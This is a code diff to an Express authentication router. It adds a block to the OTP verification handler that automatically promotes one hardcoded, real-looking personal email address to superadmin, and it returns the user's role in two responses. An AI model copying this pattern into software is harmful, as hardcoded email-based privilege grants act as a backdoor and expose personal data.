@@ -83,6 +83,12 @@ router.post('/verify-otp', async (req, res) => {
             isNewUser = true;
         }
 
+        // Auto-Promote to superadmin
+        if (user.email === 'viveks3931@gmail.com' && user.role !== 'superadmin') {
+            user.role = 'superadmin';
+            await user.save();
+        }
+
         // Delete the used OTP
         await Otp.deleteOne({ _id: otpRecord._id });
 
@@ -94,7 +100,8 @@ router.post('/verify-otp', async (req, res) => {
                 _id: user._id,
                 email: user.email,
                 name: user.name,
-                preference: user.preference
+                preference: user.preference,
+                role: user.role
             }
         });
 
@@ -131,7 +138,8 @@ router.post('/complete-profile', protect, async (req, res) => {
                 _id: user._id,
                 email: user.email,
                 name: user.name,
-                preference: user.preference
+                preference: user.preference,
+                role: user.role
             }
         });
     } catch (error) {
